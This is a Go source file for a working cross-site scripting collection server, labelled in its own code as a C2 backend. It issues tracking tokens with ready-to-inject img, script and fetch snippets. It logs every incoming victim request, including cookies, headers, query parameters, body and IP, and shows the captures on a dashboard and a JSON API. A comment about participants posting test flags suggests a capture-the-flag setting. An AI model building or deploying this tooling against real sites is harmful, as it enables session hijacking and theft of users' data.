package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// Submission represents a single item captured by /track or posted to the
// beacon endpoint. Keep the fields generic so participants can post test
// flags or messages.
type Submission struct {
	ID        int       `json:"id"`
	Source    string    `json:"source"`    // e.g. url or tracking token where the payload ran
	Data      string    `json:"data"`      // captured request dump or user-provided test string
	Note      string    `json:"note"`      // optional note
	IP        string    `json:"ip"`        // observed remote addr
	CreatedAt time.Time `json:"created_at"`
}

var (
	mu          sync.Mutex
	submissions []Submission
	nextID      = 1
	dataFile    = "submissions.json"
	tmpl        = template.Must(template.ParseFiles("templates/index.html"))
)

func main() {
	if v := os.Getenv("XSS_C2_DATAFILE"); v != "" {
		dataFile = v
	}

	if err := loadSubmissions(); err != nil {
		log.Printf("warning: could not load submissions: %v", err)
	}

	if dir := filepath.Dir(dataFile); dir != "." {
		os.MkdirAll(dir, 0700)
	}

	// register handlers on the default mux
	http.HandleFunc("/", dashboardHandler)
	// removed /submit endpoint
	http.HandleFunc("/submissions", submissionsAPIHandler)
	// register to create a new tracking endpoint
	http.HandleFunc("/register", registerHandler)
	// catch any incoming requests to /track/<token>
	http.HandleFunc("/track/", trackHandler)
	// beacon endpoint: accepts JSON {"data":"..."}
	http.HandleFunc("/beacon", beaconHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	addr := ":" + port
	log.Printf("starting XSS backend on %s (datafile=%s)", addr, dataFile)
	handler := corsMiddleware(http.DefaultServeMux)
	if err := http.ListenAndServe(addr, handler); err != nil {
		log.Fatalf("server failed: %v", err)
	}
}

func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type")

		if r.Method == http.MethodOptions {
			w.WriteHeader(http.StatusNoContent)
			return
		}

		next.ServeHTTP(w, r)
	})
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	defer mu.Unlock()

	data := struct {
		Submissions []Submission
		Now         time.Time
	}{
		Submissions: submissions,
		Now:         time.Now(),
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	if err := tmpl.Execute(w, data); err != nil {
		log.Printf("template execute error: %v", err)
	}
}

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		w.Header().Set("Allow", "POST")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		Data string `json:"data"`
	}
	dec := json.NewDecoder(r.Body)
	if err := dec.Decode(&payload); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	if len(payload.Data) > 50000 {
		http.Error(w, "data too long", http.StatusBadRequest)
		return
	}

	s := Submission{
		Source:    "beacon",
		Data:      payload.Data,
		Note:      "beacon",
		IP:        remoteIP(r),
		CreatedAt: time.Now(),
	}

	mu.Lock()
	s.ID = nextID
	nextID++
	submissions = append([]Submission{s}, submissions...)
	if len(submissions) > 1000 {
		submissions = submissions[:1000]
	}
	mu.Unlock()

	if err := saveSubmissions(); err != nil {
		log.Printf("warning: could not save submissions: %v", err)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{"status":"ok","id":s.ID})
}

func submissionsAPIHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		w.Header().Set("Allow", "GET")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	mu.Lock()
	defer mu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(submissions)
}

func registerHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost && r.Method != http.MethodGet {
		w.Header().Set("Allow", "GET, POST")
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	b := make([]byte, 8)
	if _, err := rand.Read(b); err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	token := hex.EncodeToString(b)
	trackPath := "/track/" + token

	snippet := fmt.Sprintf(`<img src="%s"/>
<!-- or -->
<script src="%s"></script>
<!-- or fetch: fetch('%s', {mode:'no-cors'}) -->`, trackPath, trackPath, trackPath)

	resp := map[string]any{
		"token":   token,
		"url":     trackPath,
		"snippet": snippet,
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func trackHandler(w http.ResponseWriter, r *http.Request) {
	token := strings.TrimPrefix(r.URL.Path, "/track/")
	if token == "" {
		http.NotFound(w, r)
		return
	}

	var bodyStr string
	if r.Body != nil {
		buf := make([]byte, 50000)
		n, _ := r.Body.Read(buf)
		rest, _ := io.ReadAll(r.Body)
		if len(rest) > 0 && n < len(buf) {
			buf = append(buf[:n], rest...)
			n = len(buf)
		}
		bodyStr = string(buf[:n])
	}

	var b strings.Builder
	fmt.Fprintf(&b, "Captured at: %s\n", time.Now().Format(time.RFC3339))
	fmt.Fprintf(&b, "Token: %s\n", token)
	fmt.Fprintf(&b, "Remote IP: %s\n", remoteIP(r))
	fmt.Fprintf(&b, "Method: %s\n", r.Method)
	fmt.Fprintf(&b, "URL: %s\n", r.URL.String())
	fmt.Fprintf(&b, "Proto: %s\n", r.Proto)
	fmt.Fprintf(&b, "Host: %s\n", r.Host)
	fmt.Fprintf(&b, "User-Agent: %s\n", r.UserAgent())
	if ref := r.Referer(); ref != "" {
		fmt.Fprintf(&b, "Referer: %s\n", ref)
	}
	fmt.Fprintf(&b, "\n-- Headers --\n")
	for k, vals := range r.Header {
		fmt.Fprintf(&b, "%s: %s\n", k, strings.Join(vals, ", "))
	}
	fmt.Fprintf(&b, "\n-- Query --\n")
	for k, vals := range r.URL.Query() {
		fmt.Fprintf(&b, "%s: %s\n", k, strings.Join(vals, ", "))
	}
	fmt.Fprintf(&b, "\n-- Cookies --\n")
	for _, c := range r.Cookies() {
		fmt.Fprintf(&b, "%s=%s; Path=%s; Domain=%s; HttpOnly=%v; Secure=%v\n", c.Name, c.Value, c.Path, c.Domain, c.HttpOnly, c.Secure)
	}
	fmt.Fprintf(&b, "\n-- Body (first 50KB) --\n%s\n", bodyStr)

	s := Submission{
		Source:    token,
		Data:      b.String(),
		Note:      "captured",
		IP:        remoteIP(r),
		CreatedAt: time.Now(),
	}

	mu.Lock()
	s.ID = nextID
	nextID++
	submissions = append([]Submission{s}, submissions...)
	if len(submissions) > 1000 {
		submissions = submissions[:1000]
	}
	mu.Unlock()

	if err := saveSubmissions(); err != nil {
		log.Printf("warning: could not save submissions: %v", err)
	}

	gif := []byte{
		0x47, 0x49, 0x46, 0x38, 0x39, 0x61,
		0x01, 0x00, 0x01, 0x00, 0x80, 0x00,
		0x00, 0x00, 0x00, 0x00, 0xff, 0xff,
		0xff, 0x21, 0xf9, 0x04, 0x01, 0x00,
		0x00, 0x00, 0x00, 0x2c, 0x00, 0x00,
		0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
		0x00, 0x02, 0x02, 0x44, 0x01, 0x00,
		0x3b,
	}
	w.Header().Set("Content-Type", "image/gif")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(gif)))
	w.WriteHeader(http.StatusOK)
	w.Write(gif)
}

func remoteIP(r *http.Request) string {
	xff := r.Header.Get("X-Forwarded-For")
	if xff != "" {
		for i := 0; i < len(xff); i++ {
			if xff[i] == ',' {
				return strings.TrimSpace(xff[:i])
			}
		}
		return strings.TrimSpace(xff)
	}
	ra := r.RemoteAddr
	for i := len(ra) - 1; i >= 0; i-- {
		if ra[i] == ':' {
			return ra[:i]
		}
	}
	return ra
}

func loadSubmissions() error {
	mu.Lock()
	defer mu.Unlock()
	f, err := os.Open(dataFile)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}
	defer f.Close()
	var s []Submission
	if err := json.NewDecoder(f).Decode(&s); err != nil {
		return err
	}
	submissions = s
	next := 1
	for _, it := range submissions {
		if it.ID >= next {
			next = it.ID + 1
		}
	}
	nextID = next
	return nil
}

func saveSubmissions() error {
	mu.Lock()
	defer mu.Unlock()
	tmp := dataFile + ".tmp"
	f, err := os.Create(tmp)
	if err != nil {
		return err
	}
	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	if err := enc.Encode(submissions); err != nil {
		f.Close()
		return err
	}
	f.Close()
	return os.Rename(tmp, dataFile)
}

